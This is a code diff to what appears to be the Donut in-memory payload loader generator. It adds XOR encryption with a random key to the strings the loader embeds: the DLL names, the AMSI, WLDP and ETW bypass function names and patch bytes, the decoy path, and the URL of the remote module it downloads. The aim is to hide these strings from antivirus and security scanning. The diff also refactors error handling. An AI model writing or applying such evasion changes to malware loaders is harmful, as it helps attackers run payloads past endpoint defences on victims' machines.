@@ -40,7 +40,6 @@
 #define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
  
 // required for each API used by the loader
-#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
  
 // These must be in the same order as the DONUT_INSTANCE structure defined in donut.h
 static API_IMPORT api_imports[] = { 
@@ -807,6 +806,14 @@ cleanup:
     return err;
 }
 
+static void xor_copy(char *dst, uint32_t dst_len, const char *src, uint8_t key) {
+    uint32_t i;
+    for(i = 0; src[i] != 0 && i < dst_len - 1; i++) {
+      dst[i] = src[i] ^ key;
+    }
+    dst[i] = 0;
+}
+
 /**
  * Function: build_instance
  * ----------------------------
@@ -865,6 +872,12 @@ static int build_instance(PDONUT_CONFIG c) {
     // set the module length
     inst->mod_len  = c->mod_len;
 
+    if(!gen_random(&inst->str_key, sizeof(inst->str_key))) {
+      DPRINT("gen_random() failed");
+      err = DONUT_ERROR_RANDOM;
+      goto cleanup;
+    }
+
     // encryption enabled?
     if(c->entropy == DONUT_ENTROPY_DEFAULT) {
       DPRINT("Generating random key for instance");
@@ -919,8 +932,8 @@ static int build_instance(PDONUT_CONFIG c) {
     DPRINT("Setting number of API to %" PRIi32, cnt);
     inst->api_cnt = cnt;
     
-    DPRINT("Setting DLL names to %s", DLL_NAMES);
-    strcpy(inst->dll_names, DLL_NAMES);
+    DPRINT("Setting DLL names");
+    xor_copy(inst->dll_names, sizeof(inst->dll_names), "ole32;oleaut32;wininet;mscoree;shell32", inst->str_key);
         
     // if module is .NET assembly
     if(c->mod_type == DONUT_MODULE_NET_DLL ||
@@ -950,8 +963,8 @@ static int build_instance(PDONUT_CONFIG c) {
       memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
       memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
       
-      strcpy(inst->wscript,     "WScript");
-      strcpy(inst->wscript_exe, "wscript.exe");
+      xor_copy(inst->wscript, sizeof(inst->wscript), "WScript", inst->str_key);
+      xor_copy(inst->wscript_exe, sizeof(inst->wscript_exe), "wscript.exe", inst->str_key);
       
       if(c->mod_type == DONUT_MODULE_VBS) {
         memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
@@ -963,25 +976,25 @@ static int build_instance(PDONUT_CONFIG c) {
     // if bypassing enabled, copy these strings over
     if(c->bypass != DONUT_BYPASS_NONE) {
       DPRINT("Copying strings required to bypass AMSI");
-      
-      strcpy(inst->clr,         "clr");
-      strcpy(inst->amsi,        "amsi");
-      strcpy(inst->amsiInit,    "AmsiInitialize");
-      strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
-      strcpy(inst->amsiScanStr, "AmsiScanString");
-      
+
+      xor_copy(inst->clr, sizeof(inst->clr), "clr", inst->str_key);
+      xor_copy(inst->amsi, sizeof(inst->amsi), "amsi", inst->str_key);
+      xor_copy(inst->amsiInit, sizeof(inst->amsiInit), "AmsiInitialize", inst->str_key);
+      xor_copy(inst->amsiScanBuf, sizeof(inst->amsiScanBuf), "AmsiScanBuffer", inst->str_key);
+      xor_copy(inst->amsiScanStr, sizeof(inst->amsiScanStr), "AmsiScanString", inst->str_key);
+
       DPRINT("Copying strings required to bypass WLDP");
-      
-      strcpy(inst->wldp,           "wldp");
-      strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
-      strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
+
+      xor_copy(inst->wldp, sizeof(inst->wldp), "wldp", inst->str_key);
+      xor_copy(inst->wldpQuery, sizeof(inst->wldpQuery), "WldpQueryDynamicCodeTrust", inst->str_key);
+      xor_copy(inst->wldpIsApproved, sizeof(inst->wldpIsApproved), "WldpIsClassInApprovedList", inst->str_key);
 
       DPRINT("Copying strings required to bypass ETW");
-      strcpy(inst->ntdll, "ntdll");
-      strcpy(inst->etwEventWrite, "EtwEventWrite");
-      strcpy(inst->etwEventUnregister, "EtwEventUnregister");
-      strcpy(inst->etwRet64, "\xc3");
-      strcpy(inst->etwRet32, "\xc2\x14\x00\x00");
+      xor_copy(inst->ntdll, sizeof(inst->ntdll), "ntdll", inst->str_key);
+      xor_copy(inst->etwEventWrite, sizeof(inst->etwEventWrite), "EtwEventWrite", inst->str_key);
+      xor_copy(inst->etwEventUnregister, sizeof(inst->etwEventUnregister), "EtwEventUnregister", inst->str_key);
+      xor_copy(inst->etwRet64, sizeof(inst->etwRet64), "\xC3", inst->str_key);
+      xor_copy(inst->etwRet32, sizeof(inst->etwRet32), "\xC2\x14\x00\x00", inst->str_key);
     }
     
     // if module is an unmanaged EXE
@@ -990,20 +1003,20 @@ static int build_instance(PDONUT_CONFIG c) {
       if(c->args[0] != 0) {
         DPRINT("Copying strings required to replace command line.");
         
-        strcpy(inst->dataname,   ".data");
-        strcpy(inst->kernelbase, "kernelbase");
-        strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
+        xor_copy(inst->dataname, sizeof(inst->dataname), ".data", inst->str_key);
+        xor_copy(inst->kernelbase, sizeof(inst->kernelbase), "kernelbase", inst->str_key);
+        xor_copy(inst->cmd_syms, sizeof(inst->cmd_syms), "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv", inst->str_key);
       }
       // does user want loader to run the entrypoint as a thread?
       if(c->thread != 0) {
         DPRINT("Copying strings required to intercept exit-related API");
         // these exit-related API will be replaced with pointer to RtlExitUserThread
-        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit");
+        xor_copy(inst->exit_api, sizeof(inst->exit_api), "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit", inst->str_key);
       }
     }
 
     // decoy module path
-    strcpy(inst->decoy, c->decoy);
+    xor_copy(inst->decoy, sizeof(inst->decoy), c->decoy, inst->str_key);
     
     // if the module will be downloaded
     // set the URL parameter and request verb
@@ -1026,13 +1039,13 @@ static int build_instance(PDONUT_CONFIG c) {
         }
         DPRINT("Name for module : %s", c->modname);
       }
-      strcpy(inst->server, c->server);
-      // append module name
-      strcat(inst->server, c->modname);
+      char url[DONUT_MAX_NAME];
+      snprintf(url, sizeof(url), "%s%s", c->server, c->modname);
+      xor_copy(inst->server, sizeof(inst->server), url, inst->str_key);
       // set the request verb
-      strcpy(inst->http_req, "GET");
-      
-      DPRINT("Loader will attempt to download module from : %s", inst->server);
+      xor_copy(inst->http_req, sizeof(inst->http_req), "GET", inst->str_key);
+
+      DPRINT("Loader will attempt to download module from : %s", url);
       
       // encrypt module?
       if(c->entropy == DONUT_ENTROPY_DEFAULT) {
@@ -1574,42 +1587,24 @@ static int validate_file_cfg(PDONUT_CONFIG c) {
  *
  *   OUTPUT : Donut error code.
  */
-EXPORT_FUNC 
+EXPORT_FUNC
 int DonutCreate(PDONUT_CONFIG c) {
-    int err = DONUT_ERROR_OK;
-    
+    int err;
+
     DPRINT("Entering.");
-    
+
     c->mod = c->pic = c->inst = NULL;
     c->mod_len = c->pic_len = c->inst_len = 0;
-    
-    // 1. validate the loader configuration
-    err = validate_loader_cfg(c);
-    if(err == DONUT_ERROR_OK) {
-      // 2. get information about the file to execute in memory
-      err = read_file_info(c);
-      if(err == DONUT_ERROR_OK) {
-        // 3. validate the module configuration
-        err = validate_file_cfg(c);
-        if(err == DONUT_ERROR_OK) {
-          // 4. build the module
-          err = build_module(c);
-          if(err == DONUT_ERROR_OK) {
-            // 5. build the instance
-            err = build_instance(c);
-            if(err == DONUT_ERROR_OK) {
-              // 6. build the loader
-              err = build_loader(c);
-              if(err == DONUT_ERROR_OK) {
-                // 7. save loader and any additional files to disk
-                err = save_loader(c);
-              }
-            }
-          }
-        }
-      }
-    }
-    // if there was some error, release resources
+
+    if((err = validate_loader_cfg(c)) != DONUT_ERROR_OK) goto cleanup;
+    if((err = read_file_info(c))   != DONUT_ERROR_OK) goto cleanup;
+    if((err = validate_file_cfg(c))!= DONUT_ERROR_OK) goto cleanup;
+    if((err = build_module(c))     != DONUT_ERROR_OK) goto cleanup;
+    if((err = build_instance(c))   != DONUT_ERROR_OK) goto cleanup;
+    if((err = build_loader(c))     != DONUT_ERROR_OK) goto cleanup;
+    err = save_loader(c);
+
+cleanup:
     if(err != DONUT_ERROR_OK) {
       DonutDelete(c);
     }
